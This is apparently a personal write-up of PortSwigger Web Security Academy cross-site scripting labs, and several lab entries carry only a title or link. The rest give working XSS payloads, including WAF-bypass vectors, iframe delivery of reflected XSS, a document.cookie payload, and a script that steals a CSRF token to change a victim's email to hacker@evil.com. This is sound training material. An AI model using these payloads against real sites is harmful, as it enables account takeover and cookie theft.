### Lab 01 - Reflected XSS into HTML context with nothing encoded

https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded

The user input in search bar is reflected in the page without any encoding. This is the simplest case of rXSS

**Solution**

```
<svg/onload=alert(1)>
```

### Lab 02 - Stored XSS into HTML context with nothing encoded

https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded

### Lab 03 - DOM XSS in document.write sink using source location.search

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink

### Lab 04 - DOM XSS in document.write sink using source location.search inside a select element

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element

### Lab 05 - DOM XSS in innerHTML sink using source location.search

### Lab 09 - Stored DOM XSS

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored

### Lab 10 - Exploiting cross-site scripting to steal cookies

https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies

### Lab 11 - Exploiting cross-site scripting to capture passwords

https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords

### Lab 12 - Exploiting stored XSS to perform CSRF

https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf

In this lab we see how we can leverage a **stored XSS** to perform a **CSRF** attack on a victim. We are targetting the `/change-email` functionnality to forcefully change the victim's e-mail address to something under our control.

The web application uses anti-CSRF tokens to prevent such kinds of attacks, but we can extract it by leveraging a stored XSS located in the blog comments.

1) Victim requests the page containing the anti-CSRF token we want to extract (`/my-account`). The browser will automatically pass-on the user's cookies (`allowCredentials=true`)

2) A second request is sent to modify the email address which will append both the session cookies and the `csrf` token extracted in step 1)

**Solution**

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open("get", "/my-account", true);
req.send();
function handleResponse() {
	var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
	var changeReq = new XMLHttpRequest();
	changeReq.open("post", "/my-account/change-email", true);
	changeReq.send("csrf="+token+"&email=hacker@evil.com");
};
</script>
```

### Lab 13 - Reflected XSS into HTML context with most tags and attributes blocked

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked

The user input in search bar is reflected in the page but there is a WAF protection the application against common XSS payloads.

```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
X-XSS-Protection: 0
Connection: close
Content-Length: 20

"Tag is not allowed"
```

We use Burp Intruder to check against a pre-compiled list of HTML tags to see what is blacklisted:

`GET /?search=<¬ß¬ß>` in Intruder

`<body(...)>` seems to pass the blacklist and is a known XSS vector

```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
X-XSS-Protection: 0
Connection: close
Content-Length: 26

"Attribute is not allowed"
```

Now we need to do the same for attributes:

`GET /?search=<body ¬ß¬ß>` in Intruder where `¬ß¬ß` is our injection point.

`onresize` seems to be accepted and can be combined with `body` to create a payload:

```
<body onresize="alert(1)">
```

All there is left to do is deliver the payload to the victim. It has to be interaction-free to pass the lab.

The user will load an iframe containing our rXSS payload which we will then proceed to trigger the `onresize` event by changing its style.

`<iframe src={lab instance url}/?search={URL encoded payload} onload=this.style.width='100px'>`

**Solution**

```
<iframe src=https://ac1d1f931e6c53d0c0024e0200d10019.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E onload=this.style.width='100px'>
```

### Lab 14 - Reflected XSS into HTML context with all tags blocked except custom ones

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked

Similar to previous lab except only **custom tags** are allowed.

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onfocus

We can trigger a XSS with the **onfocus(in|out)** event handler.

Once again, we deliver it our payload to the victim with an **iframe** that will execute Javascript to focus on the `<div>` upon loading.

```
<iframe src={lab instance url}/?search={URL encoded payload}#xss>
```

Payload:

```
<xss id=xss tabindex=1 onfocusin=alert(document.cookie)></xss>
```

**Solution**

```
<iframe src=https://ac6b1f4c1ea25374c01b644300f600bc.web-security-academy.net/?search=<xss id=xss tabindex=1 onfocusin=alert(document.cookie)></xss>#xss>
```

### Lab 15 - Reflected XSS with event handlers and href attributes blocked

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked

The user input in search bar is reflected in the page but there is a WAF protection the application against common XSS payloads. On top of that, all event handlers are blacklisted.

It is **still possible** to trigger XSS without the use of **event tags**. Generally, the technique relies on using anchor tags `<a>` in combination with the `href` attribute. Here `href` **as an attribute** is blocked. However, we can trick the WAF by embedding it inside a `<animate>` **svg** tag.

The WAF will not consider `href` as an attribute and allow the request to go through, however, the victim's browser will parse `href` as if it was an attribute and execute the `javascript:...` payload passed in `values` .

Read https://blog.isec.pl/xss-fun-with-animated-svg/ for more details about this technique

**Solution**

*Note: we need to label our vector with the word "Click" in order to induce the simulated lab user to perform a click action.*

```
<svg><a><animate attributeName="href" values="javascript:alert(1)"></animate><text x="20" y="20">Click Me</text></a></svg>
```

### Lab 16 - Reflected XSS with some SVG markup allowed

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed

User input in the search bar is reflected on the page but there is a WAF protecting the application against common XSS payloads.

We are permitted to use `<svg>` tags which is a common XSS vector.

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#svg

**Solution**
```
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```

### Lab 17 - Reflected XSS into attribute with angle brackets HTML-encoded

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded

### Lab 18 - Stored XSS into anchor href attribute with double quotes HTML-encoded

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded

### Lab 19 - Reflected XSS in canonical link tag

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag

This lab reflects user input in a [canonical link](https://en.wikipedia.org/wiki/Canonical_link_element#:~:text=A%20canonical%20link%20element%20is,went%20live%20in%20April%202012.) tag and escapes angle brackets.

It is possible to induce a user into triggering XSS payloads in **unexploitable** tags such as : `input hidden`, `link`, `canonical` by using the `accesskey` attribute.

This requires **user interaction**, as the victim needs to press the required key to fire the payload.

Example:

`<input type="hidden" accesskey="X" onclick="alert(1)">`

**Solution**

On macOS, `CTRL+OPTION+X` will trigger the `onclick` event

```
https://<burp_instance_url>/?%27onclick=%27alert(1)%27accesskey=%27X
```
